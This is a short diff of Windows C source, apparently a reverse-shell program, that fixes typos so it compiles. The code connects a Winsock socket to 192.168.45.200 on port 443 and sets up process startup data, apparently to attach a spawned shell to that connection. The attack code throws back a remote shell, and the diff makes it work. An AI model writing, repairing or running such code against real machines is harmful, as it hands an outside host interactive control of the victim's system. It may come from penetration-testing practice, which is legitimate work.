@@ -5,7 +5,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 int main () {
-	WSADATA wsaDATA;
+	WSADATA wsaData;
 	SOCKET s;
 	struct sockaddr_in server;
 	STARTUPINFO si;
@@ -18,7 +18,7 @@ int main () {
 	server.sin_port = htons(443);
 	server.sin_addr.s_addr = inet_addr("192.168.45.200");
 
-	WSAConnect(s, (struct sockaddr *)&server, sizeof(server), NULL, NULL, NULL, NULL;
+	WSAConnect(s, (struct sockaddr *)&server, sizeof(server), NULL, NULL, NULL, NULL);
 
 	memset(&si, 0, sizeof(si));
 	si.cb = sizeof(si);
@@ -29,6 +29,6 @@ int main () {
 	WaitForSingleObject(pi.hProcess, INFINITE);
 	
 	closesocket(s);
-	WSACLeanup();
+	WSACleanup();
 	return 0;
-]
+}
